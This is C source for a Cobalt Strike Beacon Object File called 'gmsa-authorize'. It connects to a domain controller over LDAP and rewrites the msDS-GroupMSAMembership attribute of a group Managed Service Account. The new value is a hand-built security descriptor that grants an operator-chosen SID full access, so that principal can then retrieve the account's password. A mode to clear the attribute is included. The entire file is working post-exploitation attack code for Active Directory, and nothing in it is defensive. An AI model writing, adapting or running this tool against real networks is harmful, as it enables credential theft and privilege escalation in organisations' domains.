#include <windows.h>
#include <winldap.h>
#include "beacon.h"

DECLSPEC_IMPORT LDAP * WLDAP32$ldap_initW       (PWSTR HostName, ULONG PortNumber);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_bind_sW     (LDAP * ld, PWSTR dn, PWSTR cred, ULONG method);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_modify_sW   (LDAP * ld, PWSTR dn, PLDAPModW * mods);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_unbind      (LDAP * ld);
DECLSPEC_IMPORT PWSTR  WLDAP32$ldap_err2stringW (ULONG err);
DECLSPEC_IMPORT ULONG  WLDAP32$LdapGetLastError (void);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_set_optionW (LDAP * ld, int option, void * value);

DECLSPEC_IMPORT BOOL  WINAPI ADVAPI32$ConvertStringSidToSidW(LPCWSTR StringSid, PSID * Sid);
DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetLengthSid          (PSID pSid);

DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree    (HLOCAL hMem);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError (void);

DECLSPEC_IMPORT void * __cdecl MSVCRT$memcpy(void * dst, const void * src, size_t n);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void * dst, int c, size_t n);
DECLSPEC_IMPORT int    __cdecl MSVCRT$wcscmp(const wchar_t *, const wchar_t *);


static const BYTE OWNER_SID_BA[16] = {
    0x01,
    0x02,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x05,
    0x20, 0x00, 0x00, 0x00,
    0x20, 0x02, 0x00, 0x00
};

#define OWNER_SID_LENGTH   16
#define SD_HEADER_LENGTH   20
#define ACL_HEADER_LENGTH   8
#define ACE_HEADER_LENGTH   8

#define ACCESS_MASK_FULL  0x000F01FF

#ifndef ACL_REVISION_DS
#define ACL_REVISION_DS   4
#endif

#ifndef LDAP_NO_SUCH_ATTRIBUTE
#define LDAP_NO_SUCH_ATTRIBUTE  0x10
#endif


static DWORD _build_security_descriptor(BYTE * output, DWORD output_capacity, const BYTE * authorized_sid, DWORD authorized_sid_length)
{
    DWORD ace_size          = ACE_HEADER_LENGTH + authorized_sid_length;
    DWORD acl_size          = ACL_HEADER_LENGTH + ace_size;
    DWORD descriptor_size   = SD_HEADER_LENGTH + OWNER_SID_LENGTH + acl_size;
    DWORD dacl_offset       = SD_HEADER_LENGTH + OWNER_SID_LENGTH;
    DWORD ace_offset        = dacl_offset + ACL_HEADER_LENGTH;

    if (descriptor_size > output_capacity) { return 0; }

    MSVCRT$memset(output, 0, descriptor_size);

    output[0] = 1;
    *(WORD  *)(output + 2)  = 0x8004;
    *(DWORD *)(output + 4)  = SD_HEADER_LENGTH;
    *(DWORD *)(output + 16) = dacl_offset;

    MSVCRT$memcpy(output + SD_HEADER_LENGTH, OWNER_SID_BA, OWNER_SID_LENGTH);

    output[dacl_offset + 0] = ACL_REVISION_DS;
    *(WORD  *)(output + dacl_offset + 2) = (WORD)acl_size;
    *(WORD  *)(output + dacl_offset + 4) = 1;

    output[ace_offset + 0] = 0;
    output[ace_offset + 1] = 0;
    *(WORD  *)(output + ace_offset + 2) = (WORD)ace_size;
    *(DWORD *)(output + ace_offset + 4) = ACCESS_MASK_FULL;
    MSVCRT$memcpy(output + ace_offset + ACE_HEADER_LENGTH, authorized_sid, authorized_sid_length);

    return descriptor_size;
}


static void _to_hex(const BYTE * data, DWORD length, char * output)
{
    static const char hex_chars[] = "0123456789abcdef";

    for (DWORD i = 0; i < length; i++) {
        output[i * 2]     = hex_chars[data[i] >> 4];
        output[i * 2 + 1] = hex_chars[data[i] & 0x0f];
    }
    output[length * 2] = '\0';
}


static void _do_clear(PWSTR domain_controller, PWSTR gmsa_dn)
{
    LDAP *    ldap_handle = NULL;
    ULONG     ldap_result;
    ULONG     version     = LDAP_VERSION3;
    LDAPModW  modification;
    PLDAPModW modifications[2];

    ldap_handle = WLDAP32$ldap_initW(domain_controller, LDAP_PORT);
    if (!ldap_handle) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_init failed: 0x%lx", WLDAP32$LdapGetLastError());
        return;
    }

    WLDAP32$ldap_set_optionW(ldap_handle, LDAP_OPT_PROTOCOL_VERSION, &version);

    ldap_result = WLDAP32$ldap_bind_sW(ldap_handle, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ldap_result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_bind_s failed: %ls (0x%lx)", WLDAP32$ldap_err2stringW(ldap_result), ldap_result);
        WLDAP32$ldap_unbind(ldap_handle);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] bound (SSPI Negotiate)");

    modification.mod_op                = LDAP_MOD_DELETE;
    modification.mod_type              = (PWSTR) L"msDS-GroupMSAMembership";
    modification.mod_vals.modv_strvals = NULL;

    modifications[0] = &modification;
    modifications[1] = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] ldap_modify (clear) msDS-GroupMSAMembership on %ls", gmsa_dn);

    ldap_result = WLDAP32$ldap_modify_sW(ldap_handle, gmsa_dn, modifications);

    switch (ldap_result) {
        case LDAP_SUCCESS:
            BeaconPrintf(CALLBACK_OUTPUT, "[+] msDS-GroupMSAMembership cleared (reverted to original)");
            break;
        case LDAP_NO_SUCH_ATTRIBUTE:
            BeaconPrintf(CALLBACK_OUTPUT, "[=] attribute already empty (no change)");
            break;
        case LDAP_INSUFFICIENT_RIGHTS:
            BeaconPrintf(CALLBACK_ERROR, "[!] insufficient rights: current token lacks WriteProperty " "on msDS-GroupMSAMembership");
            break;
        case LDAP_NO_SUCH_OBJECT:
            BeaconPrintf(CALLBACK_ERROR, "[!] no such object: verify gmsa_dn");
            break;
        default:
            BeaconPrintf(CALLBACK_ERROR, "[!] ldap_modify_s failed: %ls (0x%lx)", WLDAP32$ldap_err2stringW(ldap_result), ldap_result);
            break;
    }

    WLDAP32$ldap_unbind(ldap_handle);
}


void go(IN char * args, IN int alen)
{
    datap  parser;
    PWSTR  domain_controller;
    PWSTR  gmsa_dn;
    PWSTR  sid_string;
    PWSTR  action;

    LDAP * ldap_handle = NULL;
    ULONG  ldap_result;
    ULONG  version     = LDAP_VERSION3;

    PSID   authorized_sid        = NULL;
    DWORD  authorized_sid_length;
    BYTE   sd_buffer[256];
    DWORD  sd_size;

    struct berval  berval_value;
    struct berval *berval_values[2];
    LDAPModW       modification;
    PLDAPModW      modifications[2];

    BeaconDataParse(&parser, args, alen);
    domain_controller = (PWSTR) BeaconDataExtract(&parser, NULL);
    gmsa_dn           = (PWSTR) BeaconDataExtract(&parser, NULL);
    action            = (PWSTR) BeaconDataExtract(&parser, NULL);
    sid_string        = (PWSTR) BeaconDataExtract(&parser, NULL);

    if (!domain_controller || !gmsa_dn) {
        BeaconPrintf(CALLBACK_ERROR, "[!] usage: gmsa-authorize <dc> <gmsa_dn> [set|clear] [authorized_sid]");
        return;
    }

    if (action && action[0] && MSVCRT$wcscmp(action, L"clear") == 0) {
        _do_clear(domain_controller, gmsa_dn);
        return;
    }

    if (!sid_string || !sid_string[0]) {
        BeaconPrintf(CALLBACK_ERROR, "[!] set mode requires <authorized_sid>");
        return;
    }

    if (!ADVAPI32$ConvertStringSidToSidW(sid_string, &authorized_sid)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ConvertStringSidToSidW failed: 0x%lx -- bad SID string?", (unsigned long)KERNEL32$GetLastError());
        return;
    }
    authorized_sid_length = ADVAPI32$GetLengthSid(authorized_sid);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] authorized SID: %ls (%lu bytes)", sid_string, (unsigned long)authorized_sid_length);

    sd_size = _build_security_descriptor(sd_buffer, sizeof(sd_buffer), (const BYTE *)authorized_sid, authorized_sid_length);
    if (sd_size == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] SD buffer too small (SID %lu bytes)", (unsigned long)authorized_sid_length);
        KERNEL32$LocalFree(authorized_sid);
        return;
    }

    {
        char hex_header[41];
        _to_hex(sd_buffer, 20, hex_header);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] SD header: %s (%lu bytes total)", hex_header, (unsigned long)sd_size);
    }

    ldap_handle = WLDAP32$ldap_initW(domain_controller, LDAP_PORT);
    if (!ldap_handle) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_init failed: 0x%lx", WLDAP32$LdapGetLastError());
        KERNEL32$LocalFree(authorized_sid);
        return;
    }

    WLDAP32$ldap_set_optionW(ldap_handle, LDAP_OPT_PROTOCOL_VERSION, &version);

    ldap_result = WLDAP32$ldap_bind_sW(ldap_handle, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ldap_result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_bind_s failed: %ls (0x%lx)", WLDAP32$ldap_err2stringW(ldap_result), ldap_result);
        WLDAP32$ldap_unbind(ldap_handle);
        KERNEL32$LocalFree(authorized_sid);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] bound (SSPI Negotiate)");

    berval_value.bv_len  = sd_size;
    berval_value.bv_val  = (char *) sd_buffer;
    berval_values[0]     = &berval_value;
    berval_values[1]     = NULL;

    modification.mod_op              = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    modification.mod_type            = (PWSTR) L"msDS-GroupMSAMembership";
    modification.mod_vals.modv_bvals = berval_values;

    modifications[0] = &modification;
    modifications[1] = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "[*] ldap_modify msDS-GroupMSAMembership on %ls", gmsa_dn);

    ldap_result = WLDAP32$ldap_modify_sW(ldap_handle, gmsa_dn, modifications);

    switch (ldap_result) {
        case LDAP_SUCCESS:
            BeaconPrintf(CALLBACK_OUTPUT, "[+] msDS-GroupMSAMembership updated -- %ls now authorized", sid_string);
            break;
        case LDAP_INSUFFICIENT_RIGHTS:
            BeaconPrintf(CALLBACK_ERROR, "[!] insufficient rights: current token lacks WriteProperty " "on msDS-GroupMSAMembership");
            break;
        case LDAP_NO_SUCH_OBJECT:
            BeaconPrintf(CALLBACK_ERROR, "[!] no such object: verify gmsa_dn");
            break;
        default:
            BeaconPrintf(CALLBACK_ERROR, "[!] ldap_modify_s failed: %ls (0x%lx)", WLDAP32$ldap_err2stringW(ldap_result), ldap_result);
            break;
    }

    WLDAP32$ldap_unbind(ldap_handle);
    KERNEL32$LocalFree(authorized_sid);
}
